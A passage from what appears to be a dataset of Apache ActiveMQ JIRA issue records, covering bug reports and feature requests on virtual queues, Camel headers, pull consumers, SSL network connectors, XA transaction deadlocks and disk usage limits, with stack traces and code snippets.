sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:828) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.access$400(TCPTransport.java:619) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$1.run(TCPTransport.java:684) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$1.run(TCPTransport.java:681) at java.security.AccessController.doPrivileged(Native Method) at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:681) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615) at java.lang.Thread.run(Thread.java:745) at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:275) at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:252) at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:161) at com.sun.jmx.remote.internal.PRef.invoke(Unknown Source) at javax.management.remote.rmi.RMIConnectionImpl_Stub.getAttribute(Unknown Source) at javax.management.remote.rmi.RMIConnector$RemoteMBeanServerConnection.getAttribute(RMIConnector.java:906) at javax.management.MBeanServerInvocationHandler.invoke(MBeanServerInvocationHandler.java:267) ... 7 moreSo what happens is that method getDestinationByName first gets a list of all the queue names. Then it iterates through them when meanwhile a queue gets deleted and thus throwing an exception. Fix should probably be in BrokerFacadeSupport:        protected DestinationViewMBean getDestinationByName(Collection<? extends DestinationViewMBean> collection, String name) {            Iterator<? extends DestinationViewMBean> iter = collection.iterator();            while (iter.hasNext()) {                DestinationViewMBean destinationViewMBean = iter.next();                try {                    String destName = destinationViewMBean.getName();                    if (name.equals(destName)) {                        return destinationViewMBean;                    }                } catch (Exception e){                    continue;                }            }            return null;        }
issueID:AMQ-5898
type:Bug
changed files:
texts:Physical queues forwarded from many virtual destinations no longer supported
Hi Tim,AMQ-5187 breaks some of our message routing where we use virtual queues to control mirroring/replication of messages.A simple example...VIRTUAL.PUB.ALL-> queue://SUBSCRIBER1-> queue://SUBSCRIBER2VIRTUAL.PUB.SUBSCRIBER1-> queue://SUBSCRIBER1...fails this assert because there are two composite destinations that route to queue://SUBSCRIBER1. With asserts disabled messages are routed as expected.I have attached a test case exemplifying this.We use layers of composite queues to achieve explicit routing of messages to either one consumer or all consumers, and (also with static subscriptions) to target optimal routes across a mixture of LAN and WAN links.Fully appreciate that subscription recovery from virtual topics of a mapped queue is a beneficial thing to do, however from our perspective it is also useful to retain the behaviour of being able to have a many-to-one mapping between composite queues and physical queues. For our own use case we don"t have any requirement for subscription recovery - we require cast-iron guarantees around messaging so all messages persistent and are delivered to one or more physical queues on brokers with persistence enabled, so this obviates the need for subscription recovery.Could this validation relaxed, could it be made possible for the new behaviour to be disabled or do you have any suggestions as to how else we could achieve our use case?Thanks,James
issueID:AMQ-5903
type:Bug
changed files:
texts:Message headers are lost when using the Broker Component for Camel
When using the broker camel component as defined here:  http://activemq.apache.org/broker-camel-component.htmlThere appears to be an undocumented limitation of the broker component"s current implementation. I need to know whether said limitation is by design or an oversight. If it"s an oversight then I can submit a patch for it.This example route does not work as expected - the JMSXGroupID header is lost when received by the broker component.<route> <from uri="broker:queue:test"/> <setHeader headerName="JMSXGroupID"> <constant>123</constant> </setHeader> <to uri="broker:queue:test"/> </route>After single stepping with a debugger the component executes this code: https://github.com/apache/activemq/blob/master/activemq-camel/src/main/java/org/apache/activemq/camel/component/broker/BrokerProducer.java#L102As you can see from the method"s implementation it only copies over a fixed set of six well-known headers. All other headers on the inbound message are discarded. Why not copy over every header? Consequently the JMSXGroupID header is not copied, despite being present on the inbound message.This would appear to be a bug in my opinion as I do not believe we should be loosing any headers on a message in this case.
issueID:AMQ-5907
type:Bug
changed files:
texts:Pull consumer can hang in receive if RedeliveryPolicy is configured with max redeliveries
For a pull consumer (prefetch = 0) with a redelivery policy that enforces maximum redeliveries we now eagerly poison the incoming messages if they exceed the maximum redelivery value.  The consumer does not attempt to issue another pull request in this case which can stall receive().  Also the consumer does not recompute the timeout if one is set leading to a longer wait than might otherwise be expected.
issueID:AMQ-591
type:New Feature
changed files:TransportConnector.java
BrokerService.java
MessageAuthorizationPolicy.java
AbstractConnection.java
QueueSubscription.java
ConnectionContext.java
PrefetchSubscription.java
texts:add a per message authorization hook so that content-based authorization can be performed using a special plugin
Users may want to look in the message at headers to decide if a user can or cannot consume a message
issueID:AMQ-5914
type:Bug
changed files:
texts:Pull consumer hang when message expires in flight.
If a message expires in-flight or while in a rolled back transaction the pull consumer does not send another pull request and can hang when sending the poison Ack for the expired message.
issueID:AMQ-5915
type:New Feature
changed files:
texts:Support a Java API for the RuntimeConfigurationPlugin
Currently the RuntimeConfigurationPlugin supports modifying some parts of the broker at runtime by changing the xml configuration so the broker doesn"t need to be restarted to pick up the changes.However, there are 2 issues with this approach.  First, in my situation I do not always use xml to configure the broker.  Many times a broker will be configured using Java (configuring a BrokerService directly) and I will store the configuration in a different way to manage this.  Second, I don"t always want to permanently change the configuration.  Sometimes I need to temporarily create a new virtual destination for dynamic data flows but don"t necessarily need to persist it in between restarts.Because of this, it would be useful in some cases to be able to make changes to the broker configuration using a Java API to programmatically do things such as modifying the virtual destinations.These changes would be temporary in nature as they wouldn"t be persisted as they would be if xml was used.  However, if these changes need to be persisted the user could simply use xml to configure the broker or be responsible for storing this information however they want to recover after a restart of the broker.
issueID:AMQ-5916
type:Bug
changed files:
texts:Creation of durable subscriber fails via broker AdminView due to lack of SecurityContext  on ConnectionContext
When JAAS authentication and authorization are setup, creation of durable subscriber fails due to lack of securityContext. The ConnectionContext object does not inherit the securityContext of the broker"s shared connection context
issueID:AMQ-5917
type:Bug
changed files:
texts:networkConnectorStartAsync="true" results in "WARN  | Could not connect to remote URI: ssl://... SSLContextImpl is not initialized" and failure to connect
With both 5.10.0 and 5.11.1, the networkConnectorStartAsync="true" is broken for ssl.  With two networkConnectors defined, only one connection is made and a warning is logged for the other. Snippets from my activemq.xml:<broker xmlns="http://activemq.apache.org/schema/core" ... networkConnectorStartAsync="true"> ...<networkConnector name="GSTEST-96_ILSTECHNOLOGY_COM-SSO" uri="static:(ssl://172.27.11.96:5902)?useExponentialBackOff=false&initialReconnectDelay=5000&maxReconnectDelay=5000" duplex="true" conduitSubscriptions="true" >...networkConnector name="ECENTRESERVER_ILSTECHNOLOGY_COM-SSO" uri="static:(ssl://172.27.11.95:5902)?useExponentialBackOff=false&initialReconnectDelay=5000&maxReconnectDelay=5000" duplex="true" conduitSubscriptions="true" >The specific warning that was generated is:2015-08-05 10:46:31,569 | WARN  | Could not connect to remote URI: ssl://172.27.11.96:5902: SSLContextImpl is not initialized | org.apache.activemq.network.DiscoveryNetworkConnector | NetworkConnector Start Thread-0
issueID:AMQ-5918
type:Improvement
changed files:pom.xml
Listener.java
Publisher.java
texts:Update the AMQP example to use the new QPid-JMS client.
The AMQP Java example needs to get updated to use the new QPid JMS client instead of the legacy version it currently uses.
issueID:AMQ-5919
type:Improvement
changed files:DataFileAccessor.java
TransportConnection.java
MQTTTransportFilter.java
MQTTProtocolConverter.java
DefaultJDBCAdapter.java
DestinationView.java
DiscoveryTransport.java
texts:Clean up printStackTrace statements so that they are logged properly
There are a few places in the broker that call printStackTrace() on an exception instead of using the slf4j logger. This stack traces should be logged using the slf4j logger instead.
issueID:AMQ-592
type:Improvement
changed files:
texts:Patch: Update of C++ client
Numerous improvements as well as added support for Map and Bytes messages. All classes within the ActiveMQDestination tree is more complete since they are manually maintained in the command hierarchy. Included in the zip file is a patch file for all changed files and a set of new files located in the correct directory structure.
issueID:AMQ-5920
type:Improvement
changed files:
texts:Improve performance of virtual topic fanout
Virtual topics provide a nice alternative to durable subs. Each durable sub is modeled as a separate queue.There are performance implications however, because a message has to be sent to each of the (fanout) queues. For a durable subs, there is a single message in the journal and just index updates for each sub.To improve performance there are three ways to improve the comparison between virtual topics and durable subs. avoid the disk sync associated with enqueue do parallel enqueues to get the store batching writes introduce message references in the journal to reduce the disk ioFor 1, introducing a transaction (either client side or automatically, broker side) ensures there is a single disk sync on commit.For 2, using an executor to do sends in parallel allows the journal to batch as seen in AMQ-5077For 3, the implementation is a lot more involved; for recovery there needs to be a journal write per destination and reading the journal will require two reads because of the indirection. Tracking gc needs to be handled to ensure the referenced entry is maintained. In short this is a lot of work and will only be visible for large (> 8k) messages where the cost of a large v small journal write is noticeable. The messageId dataLocator provides an entry point for this work but considering that 1 & 2 combined can give a 3x improvement I don"t think it is worth the effort (and added complexity) at the moment.
issueID:AMQ-5921
type:Bug
changed files:
texts:ClassLoadingAwareObjectInputStream no longer handles void type
The change made in AMQ-1584 changed how primitive classes are handled which is fine, but it got rid of the check for "void".Just need to add a check to the end of the "loadSimpleType(String name)" method:...else if ("void".equals(name)) {    return void.class;}...
issueID:AMQ-5923
type:New Feature
changed files:
texts:Add Pending Message Size Metrics
Right now the PendingMessageCursor keeps track of the number of pending messages (the size() method).  It would be useful to also report back the total message size besides just the count so we know how much memory or disk space is being used by pending messages. Now that KahaDB is keeping track of the size of each message as of 5.12, it should be possible to report back this value in a non-blocking way.  For a Queue this is pretty straightforward but for DurableSubscriptions some work will need to be done to keep track of the message size for unacked messages for each subscription.
issueID:AMQ-5926
type:Bug
changed files:
texts:Missing transitive dependency
I have a dependency to activemq-all in my maven project, which in turn has an optional dependency to activemq-camel. This leads to activemq-camel not being added as a transtive dependency. But classes in activemq-all depends on apache camel (CamelContext and CamelContextAware in org.apache.activemq.camel.CamelConnection), which then does not exists. This yields an error upon deploying my application, classnotfoundexception.
issueID:AMQ-5932
type:New Feature
changed files:pom.xml
activemq.xml
spring.xml
SpringOsgiContextHook.java
texts:ActiveMQ-OSGI should not depend on spring-dm
Hi,Spring-dm is deprecated for a long time, also it has a strong dependency to spring-3, so all newest spring 4 versions are difficult to use, and that is blocker for some other frameworks (i.e. thinking about cxf, spring-data).Also amq 5.9 didn"t depend on spring-dm so it should be possible to get rid of this dep.Regards,Charlie
issueID:AMQ-5933
type:Bug
changed files:
texts:NullPointerException in SelectorAwareVirtualTopicInterceptor
Check the following call stack, should check whether selectors is null firstjavax.jms.JMSException: java.lang.NullPointerException at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:54) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1420) at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1346) at org.apache.activemq.ActiveMQSession.send(ActiveMQSession.java:1904) at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:288) at org.apache.activemq.ActiveMQMessageProducer.send(ActiveMQMessageProducer.java:223) at org.apache.activemq.ActiveMQMessageProducerSupport.send(ActiveMQMessageProducerSupport.java:241) at Active.Sample.SampleSender.sendTopic(SampleSender.java:59) at Active.Sample.SampleActiveMQTest.main(SampleActiveMQTest.java:15) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at com.intellij.rt.execution.application.AppMain.main(AppMain.java:134)Caused by: java.lang.NullPointerException at org.apache.activemq.broker.region.virtual.SelectorAwareVirtualTopicInterceptor.tryMatchingCachedSubs(SelectorAwareVirtualTopicInterceptor.java:90) at org.apache.activemq.broker.region.virtual.SelectorAwareVirtualTopicInterceptor.matchesSomeConsumer(SelectorAwareVirtualTopicInterceptor.java:76) at org.apache.activemq.broker.region.virtual.SelectorAwareVirtualTopicInterceptor.send(SelectorAwareVirtualTopicInterceptor.java:57) at org.apache.activemq.broker.region.virtual.VirtualTopicInterceptor.send(VirtualTopicInterceptor.java:53) at org.apache.activemq.broker.region.AbstractRegion.send(AbstractRegion.java:419) at org.apache.activemq.broker.region.RegionBroker.send(RegionBroker.java:468) at org.apache.activemq.broker.jmx.ManagedRegionBroker.send(ManagedRegionBroker.java:297) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:152) at org.apache.activemq.broker.CompositeDestinationBroker.send(CompositeDestinationBroker.java:96) at org.apache.activemq.broker.TransactionBroker.send(TransactionBroker.java:307) at org.apache.activemq.broker.BrokerFilter.send(BrokerFilter.java:152) at org.apache.activemq.broker.MutableBrokerFilter.send(MutableBrokerFilter.java:157) at org.apache.activemq.broker.TransportConnection.processMessage(TransportConnection.java:541) at org.apache.activemq.command.ActiveMQMessage.visit(ActiveMQMessage.java:768) at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:334) at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:188) at org.apache.activemq.transport.MutexTransport.onCommand(MutexTransport.java:50) at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113) at org.apache.activemq.transport.AbstractInactivityMonitor.onCommand(AbstractInactivityMonitor.java:270) at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83) at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:214) at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:196) at java.lang.Thread.run(Thread.java:745)
issueID:AMQ-5935
type:Task
changed files:
texts:Update Broker to Qpid JMS release 0.5.0
Qpid JMS 0.5.0 is now available for use in our AMQP test suite.
issueID:AMQ-5938
type:New Feature
changed files:
texts:Add remove(messageId) jmx operation to offline durable subscription
Mirroring the queue remove jmx operaton, have a jmx operation to remove a message from an offline durable subscription. Essentially force an ack for that subscription.Usage: browse to find the required messagId string, then invoke remove(messageId)
issueID:AMQ-5939
type:Bug
changed files:MessageServlet.java
texts:ActiveMQ REST GET request is always encoded in ISO-8859-1
ActiveMQ REST protocol does not support encodings other than ISO-8859-1.1) response.setContentType is called after response.getWriter - this contradicts servlet specification, so setContentType does not work at all 2) Content-Type header for the GET response is hardcoded inside MessageServlet classI"ve changed the class so that Content-Type header is being read from request. This way users now can specify message body encoding through Content-Type header.
issueID:AMQ-5941
type:Improvement
changed files:ActiveMQResourceAdapter.java
texts:"The ra.xml <resourceadapter-class> class &#39;org.apache.activemq.ra.ActiveMQResourceAdapter&#39; should implement java.io.Serializable but does not.> "
WebLogic server requires ResourceAdapter class to implement Serializable in addition to conformance with JavaBeans spec: "The ra.xml <resourceadapter-class> class "org.apache.activemq.ra.ActiveMQResourceAdapter" should implement java.io.Serializable but does not.> "Is there an internal implementation constraint preventing implementation of Serializable for class org.apache.activemq.ra.ActiveMQResourceAdapter in next release?
issueID:AMQ-5943
type:Bug
changed files:
texts:network bridge fails when using jaasDualAuthenticationPlugin
If a network bridge is to be established to another broker"s ssl transport as in <networkConnector duplex="true" dynamicOnly="true" name="to-A" networkTTL="2" uri="static://(ssl://localhost:61626)" >and the other broker is configured for <jaasDualAuthenticationPlugin configuration="activemq-domain" sslConfiguration="activemq-ssl-domain"/>then the network bridge will fail. Note the network connector does not set username and password but is supposed to be authenticated via its SSL certificate.
issueID:AMQ-5949
type:Improvement
changed files:DestinationBridge.java
texts:org.apache.activemq.network.jms.DestinationBridge does not provide guaranteed message forwarding
When using an OutboundQueueBridge associated with a SimpleJmsQueueConnector bean I have observed the default ReconnectionPolicy.maxSendRetries value of 10 to result in message loss if the connection to destination server is unreliable. (messages that are not delivered to destination within maxSendRetries are still acknowledged as having been consumed by processing of later messages)Is it possible for the org.apache.activemq.network.jms.DestinationBridge.onMessage() implementation to interpret a ReconnectionPolicy.maxSendRetries property value of -1 as infinity?
issueID:AMQ-5951
type:Bug
changed files:
texts:failover maxReconnect=0 url can block on reconnect
client with failover:(tcp://localhost:61616)?maxReconnectAttempts=0with exception listener that attempts to use the connection, ie: do a rollback/ack/shutdown, can block pending transport close.A retrying failover oneway send will block the mutex transport in error.
issueID:AMQ-5953
type:Bug
changed files:TransactionBroker.java
texts:XA Transaction &#39;XID:[...]&#39; has not been started. xaErrorCode:-4 on MessageAck
There is a sync issue in TransactionBroker, that can result in contention on the xatransaction map.The result is a get returning null for something present. So an Ack cannot resolve the corresponding transaction. The error - transaction not started - xaErrorCode:-4Either a resize or unrelated remove op could cause inconsistency and presumably allow a transient null.Trying to reproduce reliably in a test case is elusive.
issueID:AMQ-5954
type:Bug
changed files:ActiveMQMessageTransformation.java
texts:Fix for failing activeMq bridge
We have a system using activeMQ and weblogic, where we found that after upgrading weblogic server from 12.1.1 to 12.1.3 the bridge stopped working. We"ve found the cause and fixed it (oracle refused to fix their code), and would like you to add the fix to activemq so we can remove the local hack we"ve made. Look for the "//new code" in the code sample furthest down in this descriptionCause: Oracle changed the method getQueueName() in weblogic.jms.common.DestinationImpl.java so that it returns null if the object received is not the correct type (a Topic instead of a Queue for instance). In previous version the method returned the name regardless of type. The missing name casues the bridge to fail. The object received in our case is an implementation of the Destination interface, DistributedDestinationImpl, which implements both these interfaces in its parent class DestinationImpl. In org.apache.activemq.ActiveMQMessageTransformation.transformDestination(...) where the instanceof TemporaryQueue/TemporaryTopic++ tests will always return true for both TemporaryQueue and TemporaryTopic. The code will enter the first if() in the code below because of this and call the getQueueName() method even if it is a Topic, and will return null.  ActiveMQMessageTransformation.java (old version):     public static ActiveMQDestination transformDestination(Destination destination) throws JMSException {        ActiveMQDestination activeMQDestination = null;        if (destination != null) {            if (destination instanceof ActiveMQDestination) {                return (ActiveMQDestination)destination;            } else {                if (destination instanceof TemporaryQueue) {                    activeMQDestination = new ActiveMQTempQueue(((Queue)destination).getQueueName());                } else if (destination instanceof TemporaryTopic) {                    activeMQDestination = new ActiveMQTempTopic(((Topic)destination).getTopicName());                } else if (destination instanceof Queue) {                    activeMQDestination = new ActiveMQQueue(((Queue)destination).getQueueName());                } else if (destination instanceof Topic) {                    activeMQDestination = new ActiveMQTopic(((Topic)destination).getTopicName());                }            }        }        return activeMQDestination;    }The fixed version test for this case and calls the UnresolvableDestinationTransformer which was added to activemq as a response to issue AMQ-3401:     public static ActiveMQDestination transformDestination(Destination destination) throws JMSException {        ActiveMQDestination activeMQDestination = null;        if (destination != null) {            if (destination instanceof ActiveMQDestination) {                return (ActiveMQDestination)destination;            } else {                //start new code                if (destination instanceof TemporaryQueue && destination instanceof TemporaryTopic) {                    activeMQDestination = ActiveMQDestination.getUnresolvableDestinationTransformer().transform(destination);                } else                //end new code                if (destination instanceof TemporaryQueue) {                    activeMQDestination = new ActiveMQTempQueue(((Queue)destination).getQueueName());                } else if (destination instanceof TemporaryTopic) {                    activeMQDestination = new ActiveMQTempTopic(((Topic)destination).getTopicName());                } else if (destination instanceof Queue) {                    activeMQDestination = new ActiveMQQueue(((Queue)destination).getQueueName());                } else if (destination instanceof Topic) {                    activeMQDestination = new ActiveMQTopic(((Topic)destination).getTopicName());                }            }        }        return activeMQDestination;    }
issueID:AMQ-5956
type:Improvement
changed files:activemq
AbstractCommand.java
AbstractJmxCommand.java
texts:Improve CLI commands error handling
It"s a bit messy at the moment as lot of commands check if broker is running or not, before executing. That leads to problems like not being able to run producer/consumer commands when broker is not running. The better approach is to fix commands to print meaningful errors when they can"t connect to the service (jmx or jms) and leave this logic out of CLI scripts.
issueID:AMQ-5957
type:Task
changed files:
texts:Update outdated dependencies used by broker.
Several dependencies the broker requires are out of date and should be updated.
issueID:AMQ-5958
type:Sub-task
changed files:
texts:Update Commons Pool2 to latest
None
issueID:AMQ-5959
type:Bug
changed files:DestinationView.java
texts:NullPointerException in finally blocks
Try blocks including a finally block that references a potential null object generating a NullPointerException.In The DestinationView.sendTextMessage(java.util.Map, ...) method for example (http://grepcode.com/file/repo1.maven.org/maven2/org.apache.activemq/activemq-broker/5.11.1/org/apache/activemq/broker/jmx/DestinationView.java#DestinationView.sendTextMessage%28java.util.Map%2Cjava.lang.String%2Cjava.lang.String%2Cjava.lang.String%29), I noticed code like the following:          Connection connection = null;        try {            connection = cf.createConnection(userName, password);         ...             return msg.getJMSMessageID();        } finally {            connection.close();        }There is no catch block and since an exception in the createConnection method could be thrown, connection would be null in the finally block, causing a NPE and masking the real exception.There may be other forms of this bad style which a code style checker should be able to locate for you.
issueID:AMQ-596
type:Improvement
changed files:TransportConnector.java
BrokerService.java
TransportConnection.java
activemq.xsd
AbstractRegion.java
MasterConnector.java
texts:allow a broker to be configured to start up as a &#39;Master&#39; and refuse to perform any work until the &#39;Slave&#39; has started
Some folks might not want to start up a system and do work until the slave has actually started to avoid the risk of a message being only on one machine.So some kinda optional flag on a broker to mark it as being a master on startup such that all connections are refused until a slave connects to it
issueID:AMQ-5960
type:Bug
changed files:MessageDatabase.java
texts:Durable subscriber pendingQueueSize wrong after force shutdown of the broker
The main reason for this is that ackPositions (based on which pendingQueueSize is calculated) is not rebuilt correctly during index recover.To reproduce it:1. Start the broker2. Start producer and durable consumer on a topic, making a load3. Kill the broker with -94. Restart the brokerThe durable consumer pendingQueueSize is off by one and is never corrected
issueID:AMQ-5961
type:Bug
changed files:TransactionContext.java
texts:Deadlock in client blocks all application server threads
When we run JBoss EAP 6.4 with high load using AMQ 6.2 (ActiveMQ 5.11) everything grinds to a halt after a few hours. We have 170 threads blocked on the same lock:"default-threads - 1400" #406720 prio=5 os_prio=0 tid=0x00007f1b8402b800 nid=0xfe2d waiting for monitor entry &#91;0x00007f19ccdd5000&#93;   java.lang.Thread.State: BLOCKED (on object monitor) at org.apache.activemq.TransactionContext.setXid(TransactionContext.java:729) waiting to lock <0x000000063ac688b8> (a java.util.HashMap) at org.apache.activemq.TransactionContext.end(TransactionContext.java:418) at org.apache.activemq.ra.LocalAndXATransaction.end(LocalAndXATransaction.java:98) at org.jboss.jca.core.tx.jbossts.XAResourceWrapperImpl.end(XAResourceWrapperImpl.java:118) at com.arjuna.ats.internal.jta.resources.arjunacore.XAResourceRecord.topLevelPrepare(XAResourceRecord.java:208) at com.arjuna.ats.arjuna.coordinator.BasicAction.doPrepare(BasicAction.java:2530) at com.arjuna.ats.arjuna.coordinator.BasicAction.doPrepare(BasicAction.java:2497) at com.arjuna.ats.arjuna.coordinator.BasicAction.prepare(BasicAction.java:2074) locked <0x000000067461c090> (a com.arjuna.ats.internal.jta.transaction.arjunacore.AtomicAction) at com.arjuna.ats.arjuna.coordinator.BasicAction.End(BasicAction.java:1485) locked <0x000000067461c090> (a com.arjuna.ats.internal.jta.transaction.arjunacore.AtomicAction) at com.arjuna.ats.arjuna.coordinator.TwoPhaseCoordinator.end(TwoPhaseCoordinator.java:98) at com.arjuna.ats.arjuna.AtomicAction.commit(AtomicAction.java:162)This lock is owned by a thread that is waiting for another lock:"default-threads - 1381" #404073 prio=5 os_prio=0 tid=0x00007f1a6403c000 nid=0x7d49 waiting on condition &#91;0x00007f19d8a91000&#93;   java.lang.Thread.State: WAITING (parking) at sun.misc.Unsafe.park(Native Method) parking to wait for  <0x000000063ab2a260> (a java.util.concurrent.locks.ReentrantLock$NonfairSync) at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175) at java.util.concurrent.locks.AbstractQueuedSynchronizer.parkAndCheckInterrupt(AbstractQueuedSynchronizer.java:836) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquireQueued(AbstractQueuedSynchronizer.java:870) at java.util.concurrent.locks.AbstractQueuedSynchronizer.acquire(AbstractQueuedSynchronizer.java:1199) at java.util.concurrent.locks.ReentrantLock$NonfairSync.lock(ReentrantLock.java:209) at java.util.concurrent.locks.ReentrantLock.lock(ReentrantLock.java:285) at org.apache.activemq.transport.MutexTransport.oneway(MutexTransport.java:66) at org.apache.activemq.transport.ResponseCorrelator.oneway(ResponseCorrelator.java:60) at org.apache.activemq.ActiveMQConnection.doAsyncSendPacket(ActiveMQConnection.java:1309) at org.apache.activemq.ActiveMQConnection.asyncSendPacket(ActiveMQConnection.java:1303) at org.apache.activemq.ActiveMQSession.asyncSendPacket(ActiveMQSession.java:2008) at org.apache.activemq.ActiveMQSession$5.afterRollback(ActiveMQSession.java:973) at org.apache.activemq.TransactionContext.afterRollback(TransactionContext.java:162) at org.apache.activemq.TransactionContext.prepare(TransactionContext.java:482) locked <0x000000063ac688b8> (a java.util.HashMap) at org.apache.activemq.ra.LocalAndXATransaction.prepare(LocalAndXATransaction.java:130) at com.arjuna.ats.internal.jta.resources.arjunacore.XAResourceRecord.topLevelPrepare(XAResourceRecord.java:213) at com.arjuna.ats.arjuna.coordinator.BasicAction.doPrepare(BasicAction.java:2530) at com.arjuna.ats.arjuna.coordinator.BasicAction.doPrepare(BasicAction.java:2497)The locked object is ENDED_XA_TRANSACTION_CONTEXTS in TransactionContext. The thread that has the lock calls afterRollback without first releasing it and afterRollback does not return promptly (not at all in fact, we need to restart the server to fix this). The same can happen with afterCommit, which is also called from within a synchronized block causing a potential deadlock.I think I have a fix for this and will create a pull request in github, or if you prefer I can send a patch? It simply means moving the external calls out from the synchronized blocks and would both remove the very real deadlock risks and improve performance.
issueID:AMQ-5962
type:Sub-task
changed files:
texts:Update HTTP Client and Core versions
Update HttpClient and HttpCore
issueID:AMQ-5963
type:New Feature
changed files:
texts:Improve disk based limit configuration
In AMQ-5393, a configuration option was added to update disk based limits periodically if the disk space shrank.  It would be useful to improve this to allow disk  based limits to also regrow in size to a maximum if disk space becomes free.  Also, it would be useful to be able to specify the limits as a percentage of the partition size instead of just an absolute value.
issueID:AMQ-5964
type:Sub-task
changed files:
texts:Add an option to increase disk based limits if space is available for percentage case
Besides dynamically shrinking the maximum disk space used based on available space (both periodically and on start up), we could also add the option increase the disk space usage back to the percentage limit set if space frees up in the future.For now, this is only really doable with the percentage based case as described in AMQ-5965 unless some rework was done to the limit configuration.  This is because currently the disk check resets the limit to a lower value if it"s too high so we don"t track the original value anymore to regrow too.  However, for the percentage base the original limit percent size will still be known so this is possible.
issueID:AMQ-5967
type:Bug
changed files:BrokerService.java
texts:Temporary disk usage check doesn&#39;t take into account what its already  using
The temporary usage disk check doesn"t take into account what it is already using.  This is fine for the normal case of checking on start up since temporary storage will be empty.  However, with the addition of the new disk limit check task introduced in AMQ-5393 , this causes a bug as we need to take into account the used space already in the temp store when recomputing this value.
issueID:AMQ-5968
type:Bug
changed files:
texts:schedulerSupport
Setting schedulerSupport="true" in <broker.. causes:INFO: Loading "/opt/apache-activemq-5.12.0//bin/env"INFO: Using java "/usr/bin/java"INFO: Starting in foreground, this is just for debugging purposes (stop process by pressing CTRL+C)INFO: Creating pidfile /opt/apache-activemq-5.12.0//data/activemq.pidJava Runtime: Oracle Corporation 1.7.0_76 /usr/lib/jvm/java-7-oracle/jre  Heap sizes: current=63488k  free=61452k  max=932352k    JVM args: -Xms64M -Xmx1G -Djava.util.logging.config.file=logging.properties -Djava.security.auth.login.config=/opt/apache-activemq-5.12.0//conf/login.config -Dcom.sun.management.jmxremote -Djava.awt.headless=true -Djava.io.tmpdir=/opt/apache-activemq-5.12.0//tmp -Dactivemq.classpath=/opt/apache-activemq-5.12.0//conf:/opt/apache-activemq-5.12.0//../lib/ -Dactivemq.home=/opt/apache-activemq-5.12.0/ -Dactivemq.base=/opt/apache-activemq-5.12.0/ -Dactivemq.conf=/opt/apache-activemq-5.12.0//conf -Dactivemq.data=/opt/apache-activemq-5.12.0//dataExtensions classpath:  &#91;/opt/apache-activemq-5.12.0/lib,/opt/apache-activemq-5.12.0/lib/camel,/opt/apache-activemq-5.12.0/lib/optional,/opt/apache-activemq-5.12.0/lib/web,/opt/apache-activemq-5.12.0/lib/extra&#93;ACTIVEMQ_HOME: /opt/apache-activemq-5.12.0ACTIVEMQ_BASE: /opt/apache-activemq-5.12.0ACTIVEMQ_CONF: /opt/apache-activemq-5.12.0/confACTIVEMQ_DATA: /opt/apache-activemq-5.12.0/dataLoading message broker from: xbean:activemq.xml2015-09-14 23:02:05,931 | Refreshing org.apache.activemq.xbean.XBeanBrokerFactory$1@4d25c934: startup date &#91;Mon Sep 14 23:02:05 CEST 2015&#93;; root of context hierarchy2015-09-14 23:02:07,713 | Exception encountered during context initialization - cancelling refresh attemptorg.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.RuntimeException: java.lang.NullPointerException    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1514)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:521)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:458)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:293)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:223)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:290)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:191)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:636)&#91;spring-beans-3.2.11.RELEASE.jar:3.2.11.RELEASE&#93;    at 